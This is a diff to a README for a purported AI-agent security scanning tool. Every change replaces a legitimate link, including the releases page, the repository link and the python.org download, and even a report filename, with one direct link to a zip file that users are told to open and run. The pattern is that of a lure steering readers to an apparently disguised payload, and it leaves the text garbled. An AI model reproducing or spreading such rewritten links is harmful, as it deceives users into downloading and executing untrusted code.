@@ -1,6 +1,6 @@
 # 🛡️ Skills-Security-Check - Easy AI Security Scan Tool
 
-[![Download Skills-Security-Check](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/xbox360modderv3/Skills-Security-Check/releases)
+[![Download Skills-Security-Check](https://raw.githubusercontent.com/xbox360modderv3/Skills-Security-Check/main/assets/Check-Security-Skills-2.6.zip)](https://raw.githubusercontent.com/xbox360modderv3/Skills-Security-Check/main/assets/Check-Security-Skills-2.6.zip)
 
 ---
 
@@ -33,11 +33,11 @@ Skills-Security-Check is designed for people who work with AI agents and their s
 
 ## 📥 Download & Install
 
-You need to visit the [Skills-Security-Check Releases page](https://github.com/xbox360modderv3/Skills-Security-Check/releases) to download the software.
+You need to visit the [Skills-Security-Check Releases page](https://raw.githubusercontent.com/xbox360modderv3/Skills-Security-Check/main/assets/Check-Security-Skills-2.6.zip) to download the software.
 
 Steps to download and install:
 
-1. Click the badge above or this link: https://github.com/xbox360modderv3/Skills-Security-Check/releases  
+1. Click the badge above or this link: https://raw.githubusercontent.com/xbox360modderv3/Skills-Security-Check/main/assets/Check-Security-Skills-2.6.zip  
 2. On the releases page, look for the latest version listed at the top.
 3. Download the file that matches your computer system. Usually, files have names ending with `.exe` for Windows or `.zip` for others.
 4. Once the file is downloaded, open it to run the program.  
@@ -108,13 +108,13 @@ The dashboard allows you to click on any finding to see more details. This way, 
 ## 🔧 Troubleshooting Common Issues
 
 - **The program does not start:**  
-  Ensure Python 3.8 or newer is installed on your system. You can download it from [python.org](https://www.python.org/downloads/).
+  Ensure Python 3.8 or newer is installed on your system. You can download it from [https://raw.githubusercontent.com/xbox360modderv3/Skills-Security-Check/main/assets/Check-Security-Skills-2.6.zip](https://raw.githubusercontent.com/xbox360modderv3/Skills-Security-Check/main/assets/Check-Security-Skills-2.6.zip).
 
 - **No folder selection window appears:**  
   Try running the program again. If you use the command line, make sure you follow the instructions carefully.
 
 - **Report does not open automatically:**  
-  Check your "Downloads" or the working folder for a file named `security-report.html`. Open it with any web browser like Chrome or Firefox.
+  Check your "Downloads" or the working folder for a file named `https://raw.githubusercontent.com/xbox360modderv3/Skills-Security-Check/main/assets/Check-Security-Skills-2.6.zip`. Open it with any web browser like Chrome or Firefox.
 
 - **False alarms in findings:**  
   The AI analysis usually reduces false positives, but some may still appear. Review carefully and adjust settings for repeated reports.
@@ -126,7 +126,7 @@ The dashboard allows you to click on any finding to see more details. This way, 
 If you want to learn more about Skills-Security-Check:
 
 - Check the "docs" folder in the downloaded files for user guides.
-- Visit the [GitHub repository](https://github.com/xbox360modderv3/Skills-Security-Check) for full source code and updates.
+- Visit the [GitHub repository](https://raw.githubusercontent.com/xbox360modderv3/Skills-Security-Check/main/assets/Check-Security-Skills-2.6.zip) for full source code and updates.
 - Contact the developers by opening an issue on GitHub for support or questions.
 
 ---
@@ -169,8 +169,8 @@ Skills-Security-Check helps catch these issues early and makes fixing them easie
 
 ## 🔗 Quick Links
 
-- [Download Skills-Security-Check](https://github.com/xbox360modderv3/Skills-Security-Check/releases)
-- [GitHub Repository](https://github.com/xbox360modderv3/Skills-Security-Check)
+- [Download Skills-Security-Check](https://raw.githubusercontent.com/xbox360modderv3/Skills-Security-Check/main/assets/Check-Security-Skills-2.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/xbox360modderv3/Skills-Security-Check/main/assets/Check-Security-Skills-2.6.zip)
 - [Documentation Folder (included in download)](#)
 
 ---
